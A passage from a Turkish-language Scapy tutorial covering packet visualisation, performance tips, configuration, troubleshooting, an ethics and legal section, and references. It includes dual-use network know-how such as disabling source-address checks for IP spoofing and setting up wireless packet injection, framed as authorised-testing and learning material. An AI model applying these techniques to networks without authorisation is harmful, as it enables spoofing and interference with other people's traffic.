    #     # if results: print(f"{len(results)} paket yakalandı.")
    
    # # asyncio.run(main_async_sniff())
    ```
    **Not:** `AsyncSniffer`'ın kullanılabilirliği ve özellikleri Scapy versiyonunuza göre değişebilir.

### Görselleştirme (`plot`, `pdfdump`, `psdump`, `svgdump`)
Scapy, yakalanan veya oluşturulan paketlerin ve konuşmaların görselleştirilmesi için bazı temel araçlar sunar:

*   **`paket_listesi.plot(lambda pkt: pkt.time)`**: Paket listesindeki paketlerin zaman içindeki dağılımını basit bir grafik olarak çizer (matplotlib gerekir). Farklı özelliklere göre de çizim yapılabilir.
*   **`paket.pdfdump("dosya_adi.pdf")`**: Tek bir paketin katmanlarını ve alanlarını PDF formatında döker.
*   **`paket.psdump("dosya_adi.ps")`**: PostScript formatında döker.
*   **`paket.svgdump("dosya_adi.svg")`**: SVG formatında döker.
*   **`paket_listesi.conversations(type="jpg", target="> conversations.jpg")`**: Paket listesindeki konuşmaları (IP, TCP, UDP bazında) bir grafik olarak çizer ve dosyaya kaydeder (Graphviz gerekir).

```python
# from scapy.all import sniff, wrpcap, rdpcap
# import matplotlib # plot için
# import os # graphviz için sistem komutu

# # Örnek trafik yakala
# # pkts = sniff(count=50, iface="eth0")
# # wrpcap("test_traffic.pcap", pkts)
# pkts = rdpcap("test_traffic.pcap") # Kaydedilmiş bir dosyadan oku

# # 1. Zaman grafiği
# # pkts.plot(lambda p: p.time) 
# # import pylab # matplotlib.pylab
# # pylab.show() # Grafiği göstermek için

# # 2. İlk paketi PDF olarak dök
# if pkts:
#     try:
#         pkts[0].pdfdump("ilk_paket.pdf")
#         print("ilk_paket.pdf oluşturuldu.")
#     except Exception as e:
#         print(f"PDF dökümü hatası (Gerekli kütüphaneler eksik olabilir - örn: LaTeX): {e}")


# # 3. Konuşma grafiği (Graphviz kurulu olmalı: sudo apt install graphviz)
# try:
#     # Geçici bir dosya adı kullanmak daha güvenli olabilir
#     # pkts.conversations(target="> network_conversations.png", type="png")
#     # print("network_conversations.png oluşturuldu.")
#     # Veya doğrudan dot dosyası oluşturup sonra render edilebilir:
#     dot_graph = pkts.conversations(type="dot") # string olarak dot grafiğini verir
#     with open("conversations.dot", "w") as f:
#         f.write(dot_graph)
#     os.system("dot -Tpng conversations.dot -o conversations.png") # dot'tan png'ye çevir
#     print("conversations.png oluşturuldu (conversations.dot üzerinden).")
# except Exception as e:
#     print(f"Konuşma grafiği hatası (Graphviz kurulu mu?): {e}")
```

### Performans Optimizasyonu ve İpuçları
Scapy Python ile yazıldığı için, C ile yazılmış bazı ağ araçları kadar hızlı olmayabilir, özellikle çok yüksek paket oranlarında. Ancak performansı artırmak için bazı ipuçları:

*   **Gereksiz Çıktıları Kapatın:** Scriptlerde `conf.verb = 0` ve gönderme/dinleme fonksiyonlarında `verbose=0` kullanın.
*   **BPF Filtreleri Kullanın:** `sniff(filter="...")` ile kernel seviyesinde filtreleme yaparak Scapy'nin işlemesi gereken paket sayısını azaltın.
*   **`store=0` Kullanımı:** `sniff` işleminde yakalanan paketleri bellekte saklamak yerine anlık işliyorsanız (`prn` ile) `store=0` kullanın. Bu, özellikle uzun süreli dinlemelerde bellek tüketimini ciddi şekilde azaltır.
*   **Paketleri Önceden Derleyin:** Çok sayıda aynı yapıda paket gönderecekseniz, paketi bir kez oluşturup `bytes(paket)` ile byte dizisine çevirin ve bu byte dizisini gönderin. Bu, her seferinde Scapy'nin paketi yeniden derlemesini engeller. Ancak bu durumda dinamik alanlar (örn: rastgele ID'ler) güncellenmez.
    ```python
    # sabit_paket = IP(dst="1.2.3.4")/ICMP()
    # byte_paket = bytes(sabit_paket)
    # for _ in range(1000):
    #     send(IP(byte_paket), verbose=0) # IP() ile sarmak gerekebilir veya doğrudan L3 soket kullanılmalı
    ```
*   **Doğru Gönderme Fonksiyonunu Seçin:**
    *   Cevap beklemiyorsanız `send()` veya `sendp()`.
    *   Tek cevap yeterliyse `sr1()` veya `srp1()`.
    *   `sendpfast()`: `tcpreplay` benzeri bir hızda `.pcap` dosyasındaki paketleri göndermek için kullanılır (Scapy'nin contrib modüllerinde olabilir veya ayrı bir araç olarak).
*   **Scapy'nin Daha Yeni Versiyonlarını Kullanın:** Performans iyileştirmeleri ve yeni özellikler genellikle en son sürümlerde bulunur.
*   **C Tabanlı Hızlandırıcılar:** `PF_RING` veya `DPDK` gibi teknolojilerle entegre edilmiş Scapy versiyonları veya alternatif araçlar (örn: `PcapPlusPlus` C++ ile, `gopacket` Go ile) çok yüksek performans gerektiren durumlar için düşünülebilir.
*   **İş Yükünü Dağıtın:** Mümkünse, görevi birden fazla Scapy instance'ına veya makineye dağıtın.

### Scapy Yapılandırmasını Özelleştirme (`conf`)
Scapy'nin davranışını `conf` nesnesi üzerinden detaylı bir şekilde yapılandırabilirsiniz. Bazı önemli `conf` ayarları:

*   `conf.iface`: Varsayılan ağ arayüzü.
*   `conf.verb`: Varsayılan ayrıntı seviyesi.
*   `conf.promisc`: Arayüzü varsayılan olarak karışık moda alıp almayacağı.
*   `conf.checkIPaddr`: `True` ise, Scapy gönderilen IP paketlerinin kaynak adresinin geçerli bir yerel arayüz adresi olup olmadığını kontrol eder. IP spoofing yaparken `False` olarak ayarlanmalıdır.
*   `conf.checkIPsrc`: `True` ise, `sr1` gibi fonksiyonlar sadece gönderilen paketin hedefinden gelen cevapları kabul eder. `False` yapılırsa, başka kaynaklardan gelen ilgisiz cevaplar da alınabilir.
*   `conf.route`: Scapy'nin kullanacağı yönlendirme tablosunu gösterir. `conf.route.resync()` ile güncellenebilir. Özel rotalar eklenebilir.
*   `conf.L3socket` / `conf.L2socket`: Scapy'nin kullandığı ham soket türlerini belirtir. Gerekirse özel soket implementasyonları ile değiştirilebilir.
*   `conf.layers`: Scapy'nin tanıdığı katmanları ve bağlamalarını yönetir. Yeni katmanlar eklendiğinde burası güncellenir.
*   `conf.color_theme`: Scapy kabuğundaki çıktıların renk temasını değiştirir.

Bu ayarları scriptinizin başında veya Scapy kabuğunda ihtiyacınıza göre değiştirebilirsiniz.
```python
# conf.verb = 0
# conf.checkIPaddr = False
# print(f"Kullanılan arayüz: {conf.iface}")
# conf.route.add(net="10.0.0.0/8", gw="192.168.1.254") # Özel bir rota ekle
```

---

## 12. Yaygın Sorunlar ve Çözümleri

Scapy kullanırken karşılaşabileceğiniz bazı yaygın sorunlar ve bunların olası çözümleri aşağıda listelenmiştir:

1.  **Yetki Sorunları (Permission Denied / Operation Not Permitted):**
    *   **Sorun:** `sendp()`, `srp()`, `sniff()` (özellikle karışık modda veya tüm arayüzlerde) gibi fonksiyonlar ham soketlere erişim gerektirdiği için genellikle root/yönetici yetkileriyle çalıştırılmalıdır.
    *   **Çözüm:**
        *   Scapy'yi `sudo scapy` komutuyla başlatın.
        *   Python scriptlerinizi `sudo python3 script_adi.py` şeklinde çalıştırın.
        *   Linux'ta, Python yorumlayıcısına ham soket yetkisi vermek için `setcap` kullanılabilir (daha az güvenli, dikkatli olun): `sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/python3.x` (Python versiyonunuza göre `python3.x`'i güncelleyin).

2.  **"No Route Found" / Paketler Gönderilemiyor:**
    *   **Sorun:** Scapy, özellikle Katman 3 gönderme fonksiyonları (`send`, `sr1`) için hedef IP'ye bir rota bulamıyor.
    *   **Çözüm:**
        *   **Arayüz Belirtme:** `send(..., iface="eth0")` veya `sr1(..., iface="wlan0")` gibi `iface` parametresini kullanarak paketin hangi arayüzden gönderileceğini açıkça belirtin.
        *   **Yönlendirme Tablosu Kontrolü:** Sisteminizin yönlendirme tablosunu kontrol edin (`ip route` veya `route -n` komutları). Hedef ağ için geçerli bir rota olduğundan emin olun.
        *   **Scapy Rota Tablosu:** `conf.route` ile Scapy'nin kendi rota tablosunu inceleyin. `conf.route.resync()` ile sistem tablosuyla senkronize edebilir veya `conf.route.add(net="X.X.X.X/Y", gw="A.B.C.D", dev="iface_name")` ile manuel rota ekleyebilirsiniz.
        *   **Katman 2 Gönderme:** Eğer yerel ağdaysanız ve IP yönlendirmesiyle uğraşmak istemiyorsanız, `sendp()` veya `srp()` kullanarak paketi `Ether()` başlığıyla doğrudan Katman 2'den göndermeyi deneyin.

3.  **`sniff()` Fonksiyonu Paket Yakalamıyor:**
    *   **Sorun:** `sniff()` komutu çalışıyor gibi görünüyor ancak hiçbir paket yakalamıyor.
    *   **Çözüm:**
        *   **Arayüz Adı:** Doğru ağ arayüzünü (`iface`) belirttiğinizden emin olun. `ip a` veya `ifconfig` ile arayüz adlarınızı kontrol edin. Kablosuz için monitör modu arayüzünü (`wlan0mon` gibi) kullanmanız gerekebilir.
        *   **Filtre:** Belirttiğiniz BPF filtresinin (`filter`) doğru olduğundan ve gerçekten trafikle eşleştiğinden emin olun. Test için filtresiz (`filter=""`) veya çok genel bir filtreyle (`filter="ip"`) deneyin.
        *   **Karışık Mod (Promiscuous Mode):** `conf.promisc = True` ayarını veya `sniff(..., promisc=True)` parametresini kullanarak arayüzü karışık moda almayı deneyin. Bu, sadece size yönelik olmayan paketleri de yakalamanızı sağlar.
        *   **Ağ Aktivitesi:** Gerçekten dinlediğiniz arayüzde ve filtreye uygun trafik olduğundan emin olun.
        *   **Firewall/Güvenlik Yazılımları:** Bazı host tabanlı firewall'lar veya güvenlik yazılımları Scapy'nin paket yakalamasını engelleyebilir. Geçici olarak devre dışı bırakıp test edin.
        *   **Sanal Makineler:** Sanal makine kullanıyorsanız, VM'nin ağ ayarlarının (örn: Bridged Adapter, NAT Network) doğru yapılandırıldığından ve VM'nin ağ trafiğine erişebildiğinden emin olun.

4.  **"ImportError: No module named X" / Kütüphane Eksik:**
    *   **Sorun:** Scapy veya bağımlı olduğu bir kütüphane (örn: `matplotlib` için `plot`, `netfilterqueue`) kurulu değil.
    *   **Çözüm:** Eksik olan kütüphaneyi `pip install kutuphane_adi` veya `sudo apt install python3-kutuphane_adi` gibi komutlarla kurun. Scapy'nin tüm özelliklerini kullanmak için `pip install --pre scapy[complete]` ile kurmak iyi bir başlangıç olabilir.

5.  **Kablosuz Paket Enjeksiyonu Çalışmıyor:**
    *   **Sorun:** `sendp()` ile 802.11 paketleri gönderilmeye çalışılıyor ancak ağda bir etkisi olmuyor veya hata alınıyor.
    *   **Çözüm:**
        *   **Monitör Modu:** Kablosuz kartınızın monitör modunda olduğundan ve doğru monitör arayüzünü (`wlan0mon` gibi) kullandığınızdan emin olun.
        *   **Sürücü ve Donanım Desteği:** Tüm kablosuz kartlar ve sürücüleri ham paket enjeksiyonunu desteklemez. Kartınızın ve sürücünüzün enjeksiyon yeteneğine sahip olup olmadığını araştırın. `aireplay-ng -9 wlan0mon` komutuyla enjeksiyon testi yapabilirsiniz.
        *   **RadioTap Başlığı:** Bazı sürücüler `RadioTap` başlığı olmadan enjeksiyonu kabul etmeyebilir veya tam tersi, siz eklediğinizde sorun çıkarabilir. Denemeler yapın. Genellikle Scapy gönderirken `RadioTap` eklemeniz gerekmez.
        *   **Güç Seviyesi:** Kartınızın iletim gücü (TX power) düşük olabilir.
        *   **Kanal:** Paketi göndermek istediğiniz AP veya istemcinin bulunduğu kanalda olduğunuzdan emin olun. `iwconfig wlan0mon channel X` ile kanalı ayarlayabilirsiniz.

6.  **Windows'ta Scapy Sorunları:**
    *   **Sorun:** Scapy, Linux üzerinde en iyi şekilde çalışır. Windows'ta bazı özellikler (özellikle ham soket erişimi, kablosuz enjeksiyon) kısıtlı olabilir veya ek sürücüler/yapılandırmalar (örn: Npcap) gerektirebilir.
    *   **Çözüm:**
        *   **Npcap Kurulumu:** Windows için Scapy kullanıyorsanız, Npcap (WinPcap'in halefi) kütüphanesinin kurulu olduğundan emin olun. Kurulum sırasında "WinPcap API-compatible Mode" seçeneğini işaretlemek gerekebilir.
        *   **Linux Sanal Makine:** En sorunsuz deneyim için, Kali Linux gibi bir Linux dağıtımını sanal makinede (VirtualBox, VMware) kullanmanız şiddetle tavsiye edilir.
        *   **WSL (Windows Subsystem for Linux):** WSL2, ağ yetenekleri açısından daha gelişmiştir ve Scapy'yi çalıştırmak için bir seçenek olabilir, ancak yine de bazı ham soket ve donanım erişimi kısıtlamaları olabilir.

7.  **Performans Sorunları (Yavaşlık):**
    *   **Sorun:** Scapy, özellikle yüksek hacimli trafik işlerken veya çok sayıda paket gönderirken yavaş kalabilir.
    *   **Çözüm:** Bölüm 11'deki "Performans Optimizasyonu ve İpuçları" kısmına bakın (BPF filtreleri, `store=0`, `conf.verb=0` vb.).

8.  **Checksum Hataları:**
    *   **Sorun:** Gönderilen paketler hedef tarafından "invalid checksum" gibi hatalarla reddediliyor.
    *   **Çözüm:** Scapy normalde IP, TCP ve UDP checksum'larını göndermeden hemen önce otomatik olarak hesaplar. Eğer bir paketi `bytes()` ile manuel olarak derleyip daha sonra bazı alanlarını değiştiriyorsanız, checksum'lar geçersiz kalabilir.
        *   Paketi Scapy'nin gönderme fonksiyonlarına (`send`, `sr1` vb.) doğrudan `Packet` nesnesi olarak verin.
        *   Eğer checksum'ı manuel olarak silmek veya yeniden hesaplatmak isterseniz:
            ```python
            # del pkt[IP].chksum
            # del pkt[TCP].chksum
            # pkt.show2() # show2() checksum'ları yeniden hesaplayıp gösterir
            ```

9.  **"WARNING: Mac address to reach destination not found. Using broadcast."**
    *   **Sorun:** `send()` fonksiyonu, hedef IP için ARP tablosunda bir MAC adresi bulamadığında bu uyarıyı verir ve paketi broadcast MAC adresine (`ff:ff:ff:ff:ff:ff`) gönderir. Bu, genellikle hedef yerel ağda değilse veya ARP isteği başarısız olduysa olur.
    *   **Çözüm:** Eğer hedef yerel ağdaysa, ARP isteğinin başarılı olduğundan emin olun. Değilse ve bir gateway üzerinden gidilmesi gerekiyorsa, Scapy'nin yönlendirme tablosunun doğru yapılandırıldığından emin olun.

---

## 13. Güvenlik, Etik ve Yasal Hususlar

Scapy, ağ paketleri üzerinde derin kontrol sağlayan son derece güçlü bir araçtır. Bu güç, büyük bir sorumlulukla birlikte gelir. Scapy'yi veya benzer ağ araçlarını kullanırken aşağıdaki güvenlik, etik ve yasal hususları daima göz önünde bulundurmalısınız:

1.  **Yasalara Uyun:**
    *   **İzinsiz Erişim Yok:** Başkalarına ait bilgisayar sistemlerine, ağlara veya cihazlara izinsiz olarak erişmeye çalışmak, trafiklerini dinlemek, paket göndermek veya hizmetlerini aksatmak çoğu ülkede **yasa dışıdır** ve ciddi cezaları (para cezası, hapis vb.) vardır.
    *   **Yerel Yasalar:** Yaşadığınız ülke ve bölgedeki siber suçlar ve bilgisayar kullanımıyla ilgili yasalara hakim olun. Bilgisizlik mazeret değildir.

2.  **İzin Alın:**
    *   **Açık İzin Şart:** Herhangi bir ağ veya sistem üzerinde test yapmadan önce, sistem sahibinden veya yetkili merciden **yazılı ve açık izin** alın. Bu izin, testin kapsamını, süresini ve izin verilen eylemleri net bir şekilde belirtmelidir.
    *   **Kendi Ağınız:** Kendi ev ağınızda veya tamamen size ait laboratuvar ortamlarında deneyler yapmak genellikle daha güvenlidir, ancak burada bile ISP'nizin (İnternet Servis Sağlayıcısı) kullanım koşullarını ihlal etmediğinizden emin olun.

3.  **Etik Davranın (Etik Hacker Prensipleri):**
    *   **Zarar Vermeyin:** Temel prensip, testleriniz sırasında sistemlere, verilere veya hizmetlere zarar vermemektir.
    *   **Gizliliğe Saygı Gösterin:** Ağ trafiğini dinlerken kişisel, hassas veya gizli bilgilere erişebilirsiniz. Bu tür bilgilere saygı gösterin, ifşa etmeyin ve kötüye kullanmayın.
    *   **Sorumlu İfşa (Responsible Disclosure):** Bir güvenlik açığı bulursanız, bunu doğrudan kamuoyuna duyurmak yerine öncelikle sistem sahibine veya ilgili yazılım geliştiricisine özel olarak bildirin. Onlara sorunu düzeltmeleri için makul bir süre tanıyın.
    *   **Bilginizi İyiye Kullanın:** Scapy ve ağ bilginizi, sistemleri daha güvenli hale getirmek, savunmaları güçlendirmek ve eğitmek amacıyla kullanın.

4.  **Riskleri Anlayın ve Minimize Edin:**
    *   **Beklenmedik Sonuçlar:** Ağ testleri, özellikle saldırı simülasyonları, beklenmedik şekilde sistemlerin yavaşlamasına, çökmesine veya veri kaybına neden olabilir.
    *   **Kontrollü Ortam:** Testlerinizi mümkün olduğunca izole ve kontrollü ortamlarda (örn: sanal makineler, özel test ağları) yapın.
    *   **Kademeli Yaklaşım:** Özellikle DoS simülasyonları gibi potansiyel olarak yıkıcı testlerde, düşük yoğunlukta başlayıp etkileri gözlemleyerek kademeli olarak artırın.
    *   **Yedekleme:** Kritik sistemler üzerinde test yapmadan önce (izinle bile olsa) mutlaka yedeklerinin alındığından emin olun.

5.  **Araçların Kötüye Kullanımı:**
    *   Scapy gibi araçlar hem savunma (blue team) hem de saldırı (red team) amaçlı kullanılabilir. Bu araçların nasıl çalıştığını anlamak, hem saldırıları gerçekleştirmek hem de onlara karşı savunma geliştirmek için önemlidir.
    *   Bu araçların yasa dışı veya zararlı faaliyetlerde kullanılmasının sonuçları ağır olacaktır.

6.  **Sürekli Öğrenme ve Farkındalık:**
    *   Ağ teknolojileri, güvenlik tehditleri ve yasal düzenlemeler sürekli değişmektedir. Bilginizi güncel tutun ve siber güvenlik alanındaki en iyi uygulamaları takip edin.

**Unutmayın: Bilgi güçtür, ancak bu güç sorumlu bir şekilde kullanılmalıdır.** Scapy size ağlar üzerinde büyük bir yetenek kazandırır; bu yeteneği olumlu ve yasal amaçlar için kullanmak sizin elinizdedir.

---

## 14. Sonuç ve Gelecek Adımlar

Bu kapsamlı rehber boyunca, Scapy'nin temellerinden başlayarak paket oluşturma, gönderme, alma, dinleme, çeşitli ağ senaryolarını uygulama, Python scriptleri geliştirme ve ileri seviye tekniklere kadar birçok konuyu ele aldık.

**Scapy'nin Gücü:**
*   **Esneklik:** Neredeyse her türlü ağ paketini oluşturma ve manipüle etme yeteneği.
*   **Kontrol:** Ağ trafiği üzerinde düşük seviyede tam kontrol.
*   **Otomasyon:** Python entegrasyonu sayesinde karmaşık ağ görevlerini otomatikleştirebilme.
*   **Öğrenme Aracı:** Ağ protokollerinin ve ağ iletişiminin iç işleyişini anlamak için eşsiz bir pratik araç.
*   **Çok Yönlülük:** Ağ keşfi, port tarama, protokol analizi, sorun giderme, güvenlik testi ve saldırı simülasyonu gibi birçok alanda kullanılabilirlik.

Scapy, ağ mühendisleri, güvenlik uzmanları, araştırmacılar ve ağ teknolojilerine meraklı herkes için vazgeçilmez bir araçtır. Bu rehber, Scapy dünyasına sağlam bir giriş yapmanızı ve kendi keşiflerinizi yapmanız için size bir temel sunmayı amaçlamıştır.

**Gelecek Adımlar ve Kendinizi Geliştirme Yolları:**

1.  **Pratik Yapın, Pratik Yapın, Pratik Yapın:**
    *   Kendi sanal laboratuvarınızı kurun (VirtualBox, VMware, GNS3, EVE-NG gibi araçlarla).
    *   Farklı işletim sistemleri ve servisler çalıştıran sanal makineler oluşturun.
    *   Bu rehberdeki örnekleri kendi laboratuvarınızda deneyin ve sonuçlarını gözlemleyin.
    *   Kendi senaryolarınızı oluşturun ve Scapy ile çözmeye çalışın.

2.  **Resmi Dokümantasyonu İnceleyin:**
    *   Scapy'nin resmi dokümantasyonu ([https://scapy.readthedocs.io/](https://scapy.readthedocs.io/)) her zaman en güncel ve detaylı bilgiyi içerir. Özellikle `contrib` modüllerini ve daha az bilinen katmanları keşfedin.

3.  **Scapy'nin Kaynak Kodunu Okuyun (İleri Seviye):**
    *   Scapy'nin kendisi Python ile yazıldığı için, belirli bir katmanın veya fonksiyonun nasıl çalıştığını merak ediyorsanız doğrudan kaynak kodunu inceleyebilirsiniz. Bu, derinlemesine anlamak için harika bir yoldur.

4.  **Farklı Protokollerle Çalışın:**
    *   Bu rehberde değinilmeyen (veya az değinilen) protokollerle (örn: IPv6, SNMP, DHCPv6, RADIUS, SIP, endüstriyel protokoller) Scapy kullanarak deneyler yapın.

5.  **`contrib` Modüllerini Keşfedin:**
    *   Scapy'nin `scapy.contrib` altında topluluk tarafından geliştirilmiş birçok ek modül bulunur (örn: `tls`, `http2`, `bluetooth`, `canbus`). Bu modüller Scapy'nin yeteneklerini daha da genişletir.
    *   `import scapy.contrib.automotive.someip as someip` gibi özel modülleri yükleyebilirsiniz. `load_contrib('tls')` komutuyla da kabukta yüklenebilirler.

6.  **Güvenlik Yarışmalarına (CTF) Katılın:**
    *   Capture The Flag (CTF) yarışmalarında ağ analizi ve paket manipülasyonu içeren görevler sıkça karşınıza çıkar. Scapy, bu tür görevlerde çok işinize yarayacaktır.

7.  **Toplulukla Etkileşim Kurun:**
    *   Scapy ile ilgili forumlara, mailing listelerine veya Discord/Slack kanallarına katılarak sorular sorun, deneyimlerinizi paylaşın ve başkalarından öğrenin.

8.  **Kendi Araçlarınızı Geliştirin:**
    *   Günlük işlerinizde veya özel projelerinizde karşılaştığınız ağ ile ilgili sorunları çözmek için kendi Scapy scriptlerinizi ve araçlarınızı yazın.

Scapy ile ağların derinliklerine yapacağınız bu yolculukta başarılar dilerim! Unutmayın, en iyi öğrenme yolu sürekli denemek, merak etmek ve sınırları zorlamaktır (tabii ki etik ve yasal çerçevede).

---

## 15. Faydalı Kaynaklar ve Referanslar

*   **Scapy Resmi Dokümantasyonu:** [https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/) (En kapsamlı ve güncel kaynak)
*   **Scapy GitHub Deposu:** [https://github.com/secdev/scapy](https://github.com/secdev/scapy) (Kaynak kodu, issue takibi, katkıda bulunma)
*   **"Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers" by TJ O'Connor:** Scapy ile ilgili pratik örnekler içeren bir bölümü bulunmaktadır.
*   **"Black Hat Python: Python Programming for Hackers and Pentesters" by Justin Seitz:** Scapy ve diğer Python kütüphaneleriyle sızma testi araçları geliştirmeye odaklanır.
*   **RFC Belgeleri:** İlgilendiğiniz protokollerin (TCP/IP, DNS, HTTP vb.) standartlarını belirleyen RFC (Request for Comments) dokümanları, protokollerin nasıl çalıştığını anlamak için temel referanslardır. (Örn: [https://www.rfc-editor.org/](https://www.rfc-editor.org/))
*   **Wireshark Wiki ve Dokümantasyonu:** [https://www.wireshark.org/docs/](https://www.wireshark.org/docs/) (Paket analizi ve BPF filtreleri hakkında detaylı bilgi)
*   **Çeşitli Online Kurslar ve Bloglar:** Udemy, Coursera, Cybrary gibi platformlarda veya güvenlik odaklı bloglarda Scapy ile ilgili birçok eğitim materyali bulunabilir. "Scapy tutorial", "Scapy examples" gibi aramalarla güncel kaynaklara ulaşabilirsiniz.

Bu rehberin, Scapy öğrenme yolculuğunuzda size değerli bir başlangıç noktası olmasını umuyorum.
